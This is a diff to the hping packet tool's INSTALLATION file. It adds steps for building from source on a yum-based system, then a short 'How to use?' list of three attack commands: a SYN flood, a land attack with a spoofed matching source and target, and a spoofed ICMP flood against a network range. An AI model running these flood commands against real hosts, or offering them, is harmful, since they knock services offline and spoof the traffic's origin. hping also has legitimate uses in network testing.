@@ -91,3 +91,24 @@ INSTALLATION
 
 have fun,
 antirez
+
+How to install?
+1. Create workplace:
+    mkdir -p /usr/local/hping && cd /usr/local/hping
+2. Download and unzip:
+    wget https://github.com/antirez/hping/archive/master.zip && unzip master.zip && cd hping-master
+3. Install lib:
+    yum install -y libpcap-devel
+    yum install -y gcc gcc-c++
+    yum install -y tcl tcl-devel
+4. Create soft link:
+    ln -sf /usr/include/pcap-bpf.h /usr/include/net/bpf.h
+5. Make and install:
+    ./configure && make strip && make install
+6. Test:
+    hping3 -v
+
+How to use?
+1. SYN flooding: hping3 -V  -c 1000 -d 100 -S -p 21 –flood [IP ADDRESS]
+2. Land attacks: hping3 -V -c 1000 -d 100 -S -p 21 -s 80 -k -a 192.168.1.110 192.168.1.110
+3. ICMP flooding: hping3  -1 –flood -a [IP OF TARGET] [NETWORK RANGE]
